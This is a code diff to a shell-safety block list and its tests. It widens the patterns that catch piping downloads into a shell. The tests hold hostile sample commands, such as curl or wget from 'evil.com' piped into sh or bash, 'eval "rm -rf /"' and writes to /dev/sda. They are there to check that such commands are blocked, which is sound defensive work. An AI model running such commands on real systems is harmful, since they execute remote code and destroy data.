@@ -13,7 +13,7 @@ const DANGEROUS_PATTERNS = [
   'mkfs', 'dd if=', 'fdisk',
   'chmod 777 /', 'chown -R',
   '> /dev/', '> /etc/',
-  'curl | sh', 'curl | bash', 'wget | sh', 'wget | bash',
+  '| sh', '| bash',
   'eval ', 'exec ',
   '$(', '`',  // command substitution
   '; rm', '&& rm', '|| rm',  // chained destructive
@@ -42,10 +42,10 @@ describe('shell-safety: all 17 dangerous pattern groups are blocked', () => {
     ['chown -R root:root /', 'chown -R'],
     ['echo test > /dev/sda', '> /dev/'],
     ['echo bad > /etc/hostname', '> /etc/'],
-    ['curl http://evil.com | sh', 'curl | sh'],
-    ['curl http://evil.com | bash', 'curl | bash'],
-    ['wget http://evil.com | sh', 'wget | sh'],
-    ['wget http://evil.com | bash', 'wget | bash'],
+    ['curl http://evil.com | sh', '| sh'],
+    ['curl http://evil.com | bash', '| bash'],
+    ['wget http://evil.com | sh', '| sh'],
+    ['wget http://evil.com | bash', '| bash'],
     ['eval "rm -rf /"', 'eval '],
     ['exec /bin/sh', 'exec '],
     ['echo $(whoami)', '$('],
